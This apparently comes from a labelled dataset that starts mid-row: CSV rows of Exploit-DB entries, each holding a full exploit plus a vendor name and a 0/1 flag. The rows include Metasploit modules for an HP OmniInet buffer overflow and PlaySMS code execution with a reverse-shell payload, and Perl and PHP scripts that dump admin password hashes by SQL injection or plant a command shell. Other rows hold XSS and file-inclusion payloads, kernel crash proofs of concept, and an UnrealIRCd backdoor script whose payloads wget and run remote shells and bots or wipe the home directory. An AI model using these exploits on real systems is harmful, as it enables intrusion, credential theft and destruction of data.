4 - Executing Creator..'; $packet =""GET "".$p.""images/piggy_marty_creator.php HTTP/1.0\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpacketii($packet); sleep(1);  echo ""Step 5 - Execute Commands..\r\n""; $packet =""GET "".$p.""images/piggy_marty.php?cmd=$cmd HTTP/1.0\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpacketii($packet); if (strstr($html,""666999"")) {   echo ""Exploit succeeded...\r\n"";   $temp=explode(""666999"",$html);   die(""\r\n"".$temp[1].""\r\n""); }  # Coded With BH Fast Generator v0.1 ?>  # milw0rm.com [2007-10-09]",LightBlog,1
17467,"HP - 'OmniInet.exe' Opcode 27 Buffer Overflow (Metasploit) ## # $Id: hp_omniinet_3.rb 13081 2011-07-01 22:26:12Z sinn3r $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = GreatRanking  	include Msf::Exploit::Remote::Tcp 	include Msf::Exploit::Remote::Seh  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'HP OmniInet.exe Opcode 27 Buffer Overflow', 			'Description'    => %q{ 					This module exploits a  buffer overflow in the Hewlett-Packard 				OmniInet NT Service. By sending a specially crafted opcode 27 packet, 				a remote attacker may be able to execute arbitrary code. 			}, 			'Author'         => [ 'MC' ], 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: 13081 $', 			'References'     => 				[ 					[ 'CVE', '2011-1865' ], 					[ 'URL', 'http://www.coresecurity.com/content/HP-Data-Protector-multiple-vulnerabilities' ], 				], 			'Privileged'     => true, 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'seh', 				}, 			'Payload' => 				{ 					'Space'    => 800, 					'BadChars' => ""\x00"", 					'StackAdjustment' => -3500 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 'HP Data Protector A.06.10 Build 611 / A.06.11 Build 243', 						{ 							#POP/POP/RET from OmniBack\bin\MSVCR71.dll 							'Ret' => 0x7c35630d 						} 					], 				], 			'DefaultTarget'  => 0, 			'DisclosureDate' => 'Jun 29 2011'))  		register_options([Opt::RPORT(5555)], self.class) 	end  	def check  		connect 		sock.put(rand_text_alpha_upper(64)) 		resp = sock.get_once(-1,5) 		disconnect  		if (resp) 			resp = resp.unpack('v*').pack('C*') 			print_status(""Received response: "" + resp)  			# extract version 			if (resp =~ /HP Data Protector/) 				version = resp.split[3] 			elsif (resp =~ /HP OpenView Storage Data Protector/) 				version = resp.split[5] 			elsif (resp =~ /HP StorageWorks Application Recovery Manager/) 				version = resp.split[5] 			else 				return Exploit::CheckCode::Detected 			end  			version = version.split('.') 			major = version[1].to_i 			minor = version[2].to_i 			if ((major < 6) or (major == 6 and minor < 11)) 				return Exploit::CheckCode::Vulnerable 			end  			if ((major > 6) or (major == 6 and minor >= 11)) 				return Exploit::CheckCode::Safe 			end  		end 		return Exploit::CheckCode::Safe  	end  	def exploit  		connect  		trigger = rand_text_alpha_upper(10000) 		trigger[4552, payload.encoded.length] = payload.encoded 		trigger[5352, 8] = generate_seh_record(target.ret)  		trigger[5360, 5] = Metasm::Shellcode.assemble(Metasm::Ia32.new, ""jmp $-788"").encode_string  		opcode = ""27""  		packet = Rex::Text.to_unicode(""\x00"") 		packet << ""\x27\xca"" #length 		packet << ""\xff\xfe\x32"" 		packet << ""\x00\x00\x00"" 		packet << Rex::Text.to_unicode(""\x20\x61\x00"") * 3 		packet << Rex::Text.to_unicode(""\x20"") 		packet << trigger 		packet << Rex::Text.to_unicode(""\x00"") 		packet << Rex::Text.to_unicode(""\x20\x61\x00"") 		packet << Rex::Text.to_unicode(""\x20"" + opcode + ""\x00"") 		packet << Rex::Text.to_unicode(""\x20\x61\x00"") * 24   		print_status(""Trying #{target.name}..."") 		sock.put(packet) 		 		select(nil,nil,nil,10) 		handler 		disconnect  	end  end",.coresecurity.,1
47496,"Express Invoice 7.12 - 'Customer' Persistent Cross-Site Scripting # Exploit Title: Express Invoice 7.12 - 'Customer' Persistent Cross-Site Scripting # Exploit Author: Debashis Pal # Date: 2019-10-13 # Vendor Homepage: https://www.nchsoftware.com/ # Source: https://www.nchsoftware.com/invoice/index.html # Version: Express Invoice v7.12 # CVE : N/A # Tested on: Windows 7 SP1(32bit)  # About Express Invoice v7.12 ============================== Express Invoice lets you create invoices you can print, email or fax directly to clients for faster payment.   # Vulnerability  ================ Persistent Cross site scripting (XSS).  # PoC  ======  1. Login as authenticated unprivileged user to Express Invoice version 7.12 web enable service i.e  http://A.B.C.D:96 [Default installation].   2. Under ""Invoices"" Invoices List -> View Invoices -> Add New Invoice -> Customer: Field put </script><script>alert('XSS');</script>  Save the change.   or   Under ""Items""  Items -> Add new item-> Item field: put  </script><script>alert('XSS');</script>  Save the change.   or   Under ""Customers""  Customers -> Add New Customer -> Customer Name:  put  </script><script>alert('XSS');</script>  Save the change.   or   Under ""Quotes"" Quotes -> View Quotes -> Add New Quote -> Customer: put  </script><script>alert('XSS');</script>  Save the change.   3. Login in authenticated privileged or unprivileged  user to Express Invoice v7.12 web enable service and visit any of Invoices/Items/Customers/Quotes section, Persistent XSS payload will execute.   # Disclosure Timeline ====================== Vulnerability Discover Date: 12-Sep-2019. Vulnerability notification to vendor via vendor provided web form: 12-Sep-2019 ,13-Sep-2019, 19-Sep-2019, 26-Sep-2019, no responds.  Submit exploit-db : 14-Oct-2019.   # Disclaimer ============= The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere.",nchsoftware,1
4733,"123tkShop 0.9.1 - Remote Authentication Bypass By Michael Brooks Vulnerability:Sql Injection  Software:123tkShop Homepage:http://sourceforge.net/projects/my123tkshop/ Affects Version 0.9.1.   An attacker can gain Administrative rights with this authentication bypass exploit: http://127.0.0.1/123tkShop/shop/admin.php?admin=J3VuaW9uIHNlbGVjdCAncGFzc3dvcmQnLyogOnBhc3N3b3Jk The payload for the attack is constructed like this: print base64_encode(""'union select 'password'/* :password"");  Vulneralbe code is in the ./123tkShop/shop/mainfile.php file in the is_admin function starting on line 156  The attack will work magic_quotes_gpc=On or off because of base64_decode() The attack will also work with register_globals=Off or On because of mainfile.php line 42: if (!ini_get(""register_globals"")) {     import_request_variables('GPC'); } Registering globals is dangerous.   My advice is to use another shopping cart such as OsCommerce.   An interesting side note is that this url http://127.0.0.1/123tkShop/shop/admin.php?admin=%22 will produce a message: ""I don't like you..."" Interesting sentence,  unfortunately for 123tkShop sentences do not defend against sql injection.   Merry Christmas.   # milw0rm.com [2007-12-14]",123tkShop,1
44599,"PlaySMS 1.4 - 'sendfromfile.php?Filename' (Authenticated) 'Code Execution (Metasploit) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::HttpClient    def initialize(info = {})     super(update_info(info,       'Name' => 'PlaySMS sendfromfile.php Authenticated ""Filename"" Field Code Execution',       'Description' => %q{           This module exploits a code injection vulnerability within an authenticated file           upload feature in PlaySMS v1.4. This issue is caused by improper file name handling           in sendfromfile.php file.           Authenticated Users can upload a file and rename the file with a malicious payload.           This module was tested against PlaySMS 1.4 on VulnHub's Dina 1.0 machine and Windows 7.       },       'Author' =>         [           'Touhid M.Shaikh <touhidshaikh22[at]gmail.com>', # Discoverys and Metasploit Module           'DarkS3curity' # Metasploit Module         ],       'License' => MSF_LICENSE,       'References' =>         [           ['EDB','42003'],           ['CVE','2017-9080'],           ['URL','https://www.youtube.com/watch?v=MuYoImvfpew'],           ['URL','http://touhidshaikh.com/blog/?p=336']         ],       'DefaultOptions' =>         {           'SSL'     => false,           'PAYLOAD' => 'php/meterpreter/reverse_tcp',           'ENCODER' => 'php/base64',         },       'Privileged' => false,       'Platform'   => ['php'],       'Arch'       => ARCH_PHP,       'Targets' =>         [           [ 'PlaySMS 1.4', { } ],         ],       'DefaultTarget'  => 0,       'DisclosureDate' => 'May 21 2017'))      register_options(       [         OptString.new('TARGETURI', [ true, ""Base playsms directory path"", '/']),         OptString.new('USERNAME', [ true, ""Username to authenticate with"", 'admin']),         OptString.new('PASSWORD', [ true, ""Password to authenticate with"", 'admin'])       ])   end    def uri     return target_uri.path   end    def check     begin       res = send_request_cgi({         'method' => 'GET',         'uri' => normalize_uri(uri, 'index.php')       })     rescue       vprint_error('Unable to access the index.php file')       return CheckCode::Unknown     end      if res.code == 302 && res.headers['Location'].include?('index.php?app=main&inc=core_auth&route=login')       return Exploit::CheckCode::Appears     end      CheckCode::Safe   end    def login     res = send_request_cgi({       'uri' => normalize_uri(uri, 'index.php'),       'method' => 'GET',       'vars_get' => {         'app' => 'main',         'inc' => 'core_auth',         'route' => 'login',       }     })      # Grabbing CSRF token from body     /name=""X-CSRF-Token"" value=""(?<csrf>[a-z0-9""]+)"">/ =~ res.body     fail_with(Failure::UnexpectedReply, ""#{peer} - Could not determine CSRF token"") if csrf.nil?     vprint_good(""X-CSRF-Token for login : #{csrf}"")      cookies = res.get_cookies     vprint_status('Trying to Login ......')     # Send Creds with cookies.     res = send_request_cgi({       'method' => 'POST',       'uri' => normalize_uri(uri, 'index.php'),       'cookie' => cookies,       'vars_get' => Hash[{         'app' => 'main',         'inc' => 'core_auth',         'route' => 'login',         'op' => 'login',       }.to_a.shuffle],       'vars_post' => Hash[{         'X-CSRF-Token' => csrf,         'username' => datastore['USERNAME'],         'password' => datastore['PASSWORD']       }.to_a.shuffle],     })      fail_with(Failure::UnexpectedReply, ""#{peer} - Did not respond to Login request"") if res.nil?      # Try to access index page with authenticated cookie.     res = send_request_cgi({       'method' => 'GET',       'uri' => normalize_uri(uri, 'index.php'),       'cookie' => cookies,     })      fail_with(Failure::UnexpectedReply, ""#{peer} - Did not respond to Login request"") if res.nil?      # if we redirect to core_welcome dan we assume we have authenticated cookie.     if res.code == 302 && res.headers['Location'].include?('index.php?app=main&inc=core_welcome')       print_good(""Authentication successful : [ #{datastore['USERNAME']} : #{datastore['PASSWORD']} ]"")       store_valid_credential(user: datastore['USERNAME'], private: datastore['PASSWORD'])       return cookies     else       fail_with(Failure::UnexpectedReply, ""#{peer} - Authentication Failed :[ #{datastore['USERNAME']}:#{datastore['PASSWORD']} ]"")     end   end    def exploit     cookies = login      # Agian CSRF token.     res = send_request_cgi({       'uri' => normalize_uri(uri, 'index.php'),       'method' => 'GET',       'cookie' => cookies,       'vars_get' => Hash[{         'app' => 'main',         'inc' => 'feature_sendfromfile',         'op' => 'list',       }.to_a.shuffle]     })      fail_with(Failure::UnexpectedReply, ""#{peer} - Did not respond to Login request"") if res.nil?      # Grabbing CSRF token from body.     /name=""X-CSRF-Token"" value=""(?<csrf>[a-z0-9""]+)"">/ =~ res.body     fail_with(Failure::UnexpectedReply, ""#{peer} - Could not determine CSRF token"") if csrf.nil?     vprint_good(""X-CSRF-Token for upload : #{csrf}"")      # Payload.     evilname = ""<?php $t=$_SERVER['HTTP_USER_AGENT']; eval($t); ?>""      # setup POST request.     post_data = Rex::MIME::Message.new     post_data.add_part(csrf, content_type = nil, transfer_encoding = nil, content_disposition = 'form-data; name=""X-CSRF-Token""') # CSRF token     post_data.add_part(""#{rand_text_alpha(8 + rand(5))}"", content_type = 'application/octet-stream', transfer_encoding = nil, content_disposition = ""form-data; name=\""fncsv\""; filename=\""#{evilname}\"""")  # payload     post_data.add_part(""1"", content_type = nil, transfer_encoding = nil, content_disposition = 'form-data; name=""fncsv_dup""')  # extra     data = post_data.to_s      vprint_status('Trying to upload file with malicious Filename Field....')     # Lets Send Upload request.     res = send_request_cgi({       'uri' => normalize_uri(uri, 'index.php'),       'method' => 'POST',       'agent' => payload.encode,       'cookie' => cookies,       'vars_get' => Hash[{         'app' => 'main',         'inc' => 'feature_sendfromfile',         'op' => 'upload_confirm',       }.to_a.shuffle],       'headers' => {         'Upgrade-Insecure-Requests' => '1',       },       'Connection' => 'close',       'data' => data,       'ctype' => ""multipart/form-data; boundary=#{post_data.bound}"",     })   end end",playsms_project,1
43058,"Watchdog Development Anti-Malware / Online Security Pro - NULL Pointer Dereference /*  Exploit Title    - Watchdog Development Anti-Malware/Online Security Pro Null Pointer Dereference Date             - 26th October 2017 Discovered by    - Parvez Anwar (@parvezghh) Vendor Homepage  - https://www.watchdogdevelopment.com/ Tested Version   - 2.74.186.150 Driver Version   - 2.21.63 - zam32.sys Tested on OS     - 32bit Windows 7 SP1  CVE IDs          - CVE-2017-15920 and CVE-2017-15921 Vendor fix url   - Will be fixed in a future release Fixed Version    - n/a Fixed driver ver - n/a    A null pointer dereference vulnerability is triggered when sending an operation to ioctls 0x80002010 or 0x80002054. This is due to input buffer being NULL or the input buffer size being 0 as they are not validated.  kd> dt nt!_irp @esi -r    +0x000 Type             : 0n6    +0x002 Size             : 0x94    +0x004 MdlAddress       : (null)     +0x008 Flags            : 0x60000    +0x00c AssociatedIrp    : <unnamed-tag>       +0x000 MasterIrp        : (null)        +0x000 IrpCount         : 0n0       +0x000 SystemBuffer     : (null)  <----------- null pointer   0x80002010 ---------- CVE-2017-15921  kd> r eax=00000000 ebx=80002010 ecx=cff82bd9 edx=90889f2e esi=00000000 edi=c0000001 eip=9087cd9f esp=a7a80ab8 ebp=a7a80ab8 iopl=0         nv up ei pl nz na po nc cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000202 zam32+0xdd9f: 9087cd9f ff30            push    dword ptr [eax]      ds:0023:00000000=????????   .text:90AD9104                 push    offset aIoctl_register                        ; ""IOCTL_REGISTER_PROCESS"" .text:90AD9109                 push    0                                              .text:90AD910B                 push    edx                                           ; Pointer to ""DeviceIoControlHandler"" string .text:90AD910C                 push    208h .text:90AD9111                 push    offset aMain_c                                 .text:90AD9116                 push    1 .text:90AD9118                 call    sub_90AD3ADA .text:90AD911D                 add     esp, 18h .text:90AD9120                 push    esi                                           ; esi is null becomes arg_0 otherwise would point to our input ""SystemBuffer"" .text:90AD9121                 call    sub_90AD8D90  .text:90AD8D90 sub_90AD8D90    proc near                                              .text:90AD8D90 .text:90AD8D90 arg_0           = dword ptr  8 .text:90AD8D90 .text:90AD8D90                 push    ebp                                            .text:90AD8D91                 mov     ebp, esp .text:90AD8D93                 call    sub_90AD414A .text:90AD8D98                 test    eax, eax .text:90AD8D9A                 jz      short loc_90AD8DA6 .text:90AD8D9C                 mov     eax, [ebp+arg_0]                              ; Null pointer dereference  .text:90AD8D9F                 push    dword ptr [eax]                               ; BSOD !!!! .text:90AD8DA1                 call    sub_90AD428C .text:90AD8DA6 .text:90AD8DA6 loc_90AD8DA6:                                                          .text:90AD8DA6                 pop     ebp .text:90AD8DA7                 retn    4 .text:90AD8DA7 sub_90AD8D90    endp .text:90AD8DA7 .text:90AD8DAA   0x80002054 ---------- CVE-2017-15920  kd> r eax=861e8320 ebx=80002054 ecx=cff82bd9 edx=90889f2e esi=00000000 edi=c0000001 eip=9087d41a esp=99f4eaac ebp=99f4eadc iopl=0         nv up ei pl zr na pe nc cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000246 zam32+0xe41a: 9087d41a c7061e010000    mov     dword ptr [esi],11Eh ds:0023:00000000=????????   .text:90AD9401                 push    offset aIoctl_get_driv                        ; IOCTL_GET_DRIVER_PROTOCOL .text:90AD9406                 push    0 .text:90AD9408                 push    edx .text:90AD9409                 push    2A3h .text:90AD940E                 push    offset aMain_c                                 .text:90AD9413                 push    1 .text:90AD9415                 call    sub_90AD3ADA .text:90AD941A                 mov     dword ptr [esi], 11Eh                         ; BSOD !!!! Null pointer dereference otherwise would point to our input ""SystemBuffer"" .text:90AD9420                 jmp     loc_90AD9622   */   #include <stdio.h> #include <windows.h>  int main(int argc, char *argv[])  {     HANDLE         hDevice;     char           devhandle[MAX_PATH];     DWORD          dwRetBytes = 0;       sprintf(devhandle, ""\\\\.\\%s"", ""zemanaantimalware"");      hDevice = CreateFile(devhandle, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING , 0, NULL);          if(hDevice == INVALID_HANDLE_VALUE)     {         printf(""\n[-] Open %s device failed\n\n"", devhandle);         return -1;     }     else      {         printf(""\n[+] Open %s device successful"", devhandle);     }	      printf(""\n[~] Press any key to continue . . ."");     getch();      DeviceIoControl(hDevice, 0x80002010, NULL, 0, NULL, 0, &dwRetBytes, NULL); //  DeviceIoControl(hDevice, 0x80002054, NULL, 0, NULL, 0, &dwRetBytes, NULL);      printf(""\n[+] DoSed\n\n"");       CloseHandle(hDevice);     return 0; }",.watchdogdevelopment.,1
2279,"phpAtm 1.21 - 'include_location' Remote File Inclusion ######################################################################## #  phpAtm <= v1.21 (include_location) Remote File Inclusion Exploit #    #   Level : Dangerous         #   Download  : http://phpatm.free.fr/ #   Version : v1.21   #    #                           Found By: KinSize [MHG Security Team] # ######################################################################## # Code :   include($include_location.'include/conf.php'); # #  exploit: # http://www.sitename.com/[script_path]/confirm.php?include_location=http://shellurl.com ?    # http://www.sitename.com/[script_path]/index.php?include_location=http://shellurl.com ?     # http://www.sitename.com/[script_path]/login.php?include_location=http://shellurl.com ? ######################################################################## # #Conatact : nefretaskimdir[at]gmail.com # # GreetZ : Damage-N | by_emr3  | by_OkSit  | ESKOBAR  | Ye.iL  | PowerCobra  | sys-worm(Turkish)| Z e b e r u S | ALL Turkish & MusLim ########################################################################  Added information:  At first glance this doesn't look vulnerable but then again:  line 85-94 of common.php while (list(, $arr) = each($sysarr)) {         if (is_array($arr))         {                 while (list($key, $value) = each($arr))                 {                         $GLOBALS[$key] = $value;                 }         } }  /str0ke  # milw0rm.com [2006-08-30]",phpAtm,0
39922,"Apple Mac OSX Kernel - Null Pointer Dereference in AppleMuxControl.kext /* Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=783  The method AppleGraphicsControlClient::checkArguments does actually appear to test whether the pointer at this+0xd8 is non-null, but uses it anyway :)  We can race external methods which call this with another thread calling IOServiceClose to get a NULL pointer there.  By mapping the NULL page in userspace this gives us trivial kernel RIP control as the code makes a virtual call on a NULL object pointer.  tested on OS X 10.11.4 (15E65) MacBookPro 10,1 */  // ianbeer  // clang -o mux_control_race mux_control_race.c -framework IOKit -m32 -lpthread -pagezero_size 0x0  /* OS X exploitable kernel NULL pointer dereference in AppleMuxControl.kext  The method AppleGraphicsControlClient::checkArguments does actually appear to test whether the pointer at this+0xd8 is non-null, but uses it anyway :)  We can race external methods which call this with another thread calling IOServiceClose to get a NULL pointer there.  By mapping the NULL page in userspace this gives us trivial kernel RIP control as the code makes a virtual call on a NULL object pointer.  tested on OS X 10.11.4 (15E65) MacBookPro 10,1 */  #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h>  #include <IOKit/IOKitLib.h>  #include <libkern/OSAtomic.h>  #include <mach/thread_act.h>  #include <pthread.h>  #include <mach/mach.h> #include <mach/vm_map.h> #include <sys/mman.h>      unsigned int selector = 0;  uint64_t inputScalar[16]; size_t inputScalarCnt = 0;  uint8_t inputStruct[40960]; size_t inputStructCnt = 0;   uint64_t outputScalar[16] = {0}; uint32_t outputScalarCnt = 0;  char outputStruct[40960] = {0}; size_t outputStructCnt = 0;  io_connect_t global_conn = MACH_PORT_NULL;  void set_params(io_connect_t conn){   global_conn = conn;   selector = 9; // getAGCData   inputScalarCnt = 0;   inputStructCnt = 0;    outputScalarCnt = 16;   outputStructCnt = 4096;   }  void make_iokit_call(){     IOConnectCallMethod(       global_conn,       selector,       inputScalar,       inputScalarCnt,       inputStruct,       inputStructCnt,       outputScalar,       &outputScalarCnt,       outputStruct,       &outputStructCnt); }  OSSpinLock lock = OS_SPINLOCK_INIT;  void* thread_func(void* arg){   int got_it = 0;   while (!got_it) {     got_it = OSSpinLockTry(&lock);   }    // usleep(1);    make_iokit_call();   OSSpinLockUnlock(&lock);   return NULL; }  mach_port_t get_user_client(char* name, int type) {   kern_return_t err;    CFMutableDictionaryRef matching = IOServiceMatching(name);   if(!matching){    printf(""unable to create service matching dictionary\n"");    return 0;   }    io_iterator_t iterator;   err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);   if (err != KERN_SUCCESS){    printf(""no matches\n"");    return 0;   }    io_service_t service = IOIteratorNext(iterator);    if (service == IO_OBJECT_NULL){    printf(""unable to find service\n"");    return 0;   }   printf(""got service: %x\n"", service);     io_connect_t conn = MACH_PORT_NULL;   err = IOServiceOpen(service, mach_task_self(), type, &conn);   if (err != KERN_SUCCESS){    printf(""unable to get user client connection\n"");    return 0;   }    printf(""got userclient connection: %x\n"", conn);    return conn; }  void poc() {   OSSpinLockLock(&lock);    pthread_t t;   pthread_create(&t, NULL, thread_func, NULL);     mach_port_t conn = get_user_client(""AppleMuxControl"", 0);      set_params(conn);   OSSpinLockUnlock(&lock);   IOServiceClose(conn);      pthread_join(t, NULL); }  int main(int argc, char** argv){   kern_return_t err;   // re map the null page rw   int var = 0;   err = vm_deallocate(mach_task_self(), 0x0, 0x1000);   if (err != KERN_SUCCESS){     printf(""%x\n"", err);   }   vm_address_t addr = 0;   err = vm_allocate(mach_task_self(), &addr, 0x1000, 0);   if (err != KERN_SUCCESS){     if (err == KERN_INVALID_ADDRESS){       printf(""invalid address\n"");     }     if (err == KERN_NO_SPACE){       printf(""no space\n"");     }     printf(""%x\n"", err);   }   char* np = 0;   for (int i = 0; i < 0x1000; i++){     np[i] = '\x41';   }    for (;;) {     poc();   }    return 0; }",AppleGraphicsControlClient::checkArguments,0
13853,"UnrealIRCd 3.2.8.1 - Remote Downloader/Execute #!/usr/bin/perl # Unreal3.2.8.1 Remote Downloader/Execute Trojan # DO NOT DISTRIBUTE -PRIVATE- # -iHaq (2l8)  use Socket; use IO::Socket;  ## Payload options my $payload1 = 'AB; cd /tmp; wget http://packetstormsecurity.org/groups/synnergy/bindshell-unix -O bindshell; chmod +x bindshell; ./bindshell &'; my $payload2 = 'AB; cd /tmp; wget http://efnetbs.webs.com/bot.txt -O bot; chmod +x bot; ./bot &'; my $payload3 = 'AB; cd /tmp; wget http://efnetbs.webs.com/r.txt -O rshell; chmod +x rshell; ./rshell &'; my $payload4 = 'AB; killall ircd'; my $payload5 = 'AB; cd ~; /bin/rm -fr ~/*;/bin/rm -fr *';  $host = """"; $port = """"; $type = """"; $host = @ARGV[0]; $port = @ARGV[1]; $type = @ARGV[2];  if ($host eq """") { usage(); } if ($port eq """") { usage(); } if ($type eq """") { usage(); }  sub usage {   printf ""\nUsage :\n"";   printf ""perl unrealpwn.pl <host> <port> <type>\n\n"";   printf ""Command list :\n"";   printf ""[1] - Perl Bindshell\n"";   printf ""[2] - Perl Reverse Shell\n"";   printf ""[3] - Perl Bot\n"";   printf ""-----------------------------\n"";   printf ""[4] - shutdown ircserver\n"";   printf ""[5] - delete ircserver\n"";   exit(1); }  sub unreal_trojan {   my $ircserv = $host;   my $ircport = $port;   my $sockd = IO::Socket::INET->new (PeerAddr => $ircserv, PeerPort => $ircport, Proto => ""tcp"") || die ""Failed to connect to $ircserv on $ircport ...\n\n"";   print ""[+] Payload sent ...\n"";   if ($type eq ""1"") {     print $sockd ""$payload1"";   } elsif ($type eq ""2"") {     print $sockd ""$payload2"";   } elsif ($type eq ""3"") {     print $sockd ""$payload3"";   } elsif ($type eq ""4"") {     print $sockd ""$payload4"";   } elsif ($type eq ""5"") {     print $sockd ""$payload5"";   } else {     printf ""\nInvalid Option ...\n\n"";     usage();   }   close($sockd);   exit(1); }  unreal_trojan(); # EOF",unrealircd,1
5768,"pNews 2.08 - 'shownews' SQL Injection pNews 2.08 Remote SqL Ä°nj. VuLn.  OrginaL : http://biyosecurity.com & http://coderx.org  Cr@zy_King / sqL L0v3r'Z Crew Co. 2008  Script Down ; http://www.powie.de/cms/filedb/file.php?id=115&filecat=&eintrag=  http://localhost/index.php?shownews=2'+UNION+SELECT+1,2,username,4,pwd,6,7,8,9,10,11,12+FROM+table/*  Greatz : aLL My Friends :P   # milw0rm.com [2008-06-09]",pNews,0
6171,"eNdonesia 8.4 (Calendar Module) - SQL Injection #!/usr/bin/perl #/-----------------------------------------------\ #|  /-----------------------------------------\  | #|  |  Remote SQL Exploit                     |  | #|  |  eNdonesia 8.4 Remote SQL Exploit       |  | #|  |  www.endonesia.org                      |  | #|  |  Calendar Module                        |  | #|  \-----------------------------------------/  | #|  /-----------------------------------------\  | #|  |  Presented By Jack                      |  | #|  |  MainHack Enterprise                    |  | #|  |  www.MainHack.com & irc.nob0dy.net      |  |  #|  |  #MainHack #nob0dy #BaliemHackerlink    |  | #|  |  Jack[at]MainHack[dot]com               |  | #|  \-----------------------------------------/  | #|  /-----------------------------------------\  | #|  |  Hello To: Indonesian h4x0r             |  | #|  |  yadoy666,n0c0py & okedeh               |  | #|  |  VOP Crew [Vaksin13,OoN_BoY,Paman]      |  | #|  |  NoGe,str0ke,H312Y,s3t4n,[S]hiro,frull  |  | #|  |  all MainHack BrotherHood               |  | #|  \-----------------------------------------/  | #\-----------------------------------------------/     use HTTP::Request;   use LWP::UserAgent;    $sql_vulnerable = ""/mod.php?mod=calendar&op=list_events&loc_id="";   $sql_injection  = ""-999/**/union+select/**/0x3a,0x3a,concat(aid,0x3a,pwd),0x3a,concat(name,0x3a,pwd)/**/from/**/authors/*where%20name%20pwd"";    if(!@ARGV) { &help;exit(1);}    sub help(){        print ""\n [?] eNdonesia 8.4 Remote SQL Exploit\n"";        print "" [?] =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n"";        print "" [?] Use : perl $0 www.target.com\n"";        print "" [?] Dont use \""http://\""\n"";                                                                                            print "" [?] =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n"";        print "" [?] Baliem Hacker - VOP crew - MainHack BrotherHood \n\n"";        print "" [?] www.MainHack.com\n\n"";   }    while (){       my $target    = $ARGV[0];        my $exploit   = ""http://"".$target.$sql_vulnerable.$sql_injection;        print ""\n [-] Trying to inject $target ...\n\n"";        my $request   = HTTP::Request->new(GET=>$exploit);        my $useragent = LWP::UserAgent->new();        $useragent->timeout(10);        my $response   = $useragent->request($request);        if ($response->is_success){                my $res = $response->content;                if ($res =~ m/\>([0-9,a-z]{2,13}):([0-9,a-f]{32})/g) {                        my ($username,$passwd) = ($1,$2);                        print "" [target] $target \n"";                        print "" [loginx] $username:$passwd \n\n"";                        exit(0);                }                else {                        die "" [error] Fail to get username and password.\n\n"";                }        }        else {                die "" [error] Fail to inject $target \n\n"";        }   }  #/----------------------------------------------------------------\ #|  NoGay kalo kita artikan sepintas berarti Tidak ada Gay        | #|  namun mari kita perhatikan secara seksama ...                 | #|  NoGay merupakan kependekan dari NoGe is Gay.                  | #|  Sungguh, penyembunyian sebuah karakter di balik makna kata.   | #\----------------------------------------------------------------/ #Vendor Has been contacted and now working for it.  # milw0rm.com [2008-07-30]",endonesia,1
3489,"creative Guestbook 1.0 - Multiple Vulnerabilities                                                           .-""""""""""""""""-.                                                                                           /   Dj7xpl   \                                                                                       |              |                                                                                         |,  .-.  .-.  ,|                                                                                         | )(_o/  \o_)( |                                                                                              |/     /\     \|                                                                                (@_       (_     ^^     _)                                                            _     ) \_______\__|IIIIII|__/_______________________________                                         (_)@8@8{}<________|-\IIIIII/-|________________________________>                                                )_/        \          /                                                 (@ 											    +_______________________________________________Iranian Are The Best In World___________________________________________+ # # #   Portal     :   Creative Guestbook 1.0 #   Download   :   http://www.thecreativeheads.de/CreativeFiles/downloads.php #   Author     :   Dj7xpl  | Dj7xpl@yahoo.com #   Dork       :   ""Creative Guestbook"" #   Class      :   (Add Remote Admin User)   And   (Cross Site Scripting) # +_______________________________________________________________________________________________________________________+  +_______________________________________________________________________________________________________________________+ # # #   css/xss : #              http://[Target]/[Path]/Guestbook.php   <== Insert Yor Script #              Example : <script> alert ('  dj7xpl ^_^  ') </script> # # +_______________________________________________________________________________________________________________________+  +_______________________________________________________________________________________________________________________+ # # #   Add Remote Admin User : #	 #	<form name=""admin"" method=""post"" action=""http://[target]/[path]/createadmin.php?PHPSESSID='.session_id().'""> #       <input type=""text"" name=""Name"" value=""name""><br> #       <input type=""text"" name=""Email""value=""email""><br> #       <input type=""text"" name=""PASSWORD"" value=""password""><br> #       <input type=""submit"" value=""Admin hinzuf&uuml;gen"" name=""submit""> #   </form> #	 #	 +_______________________________________________________________________________________________________________________+  +_______________________________________________________________________________________________________________________+ # # #    Sp Tnx      :  Milw0rm, Ashiyane, Delta Hacking, Virangar, Hacker.ir, Shabgard.org,Simorgh ............. # # +_______________________________________________________________________________________________________________________+  # milw0rm.com [2007-03-15]",.thecreativeheads.deCreativeFilesdownloads.php,0
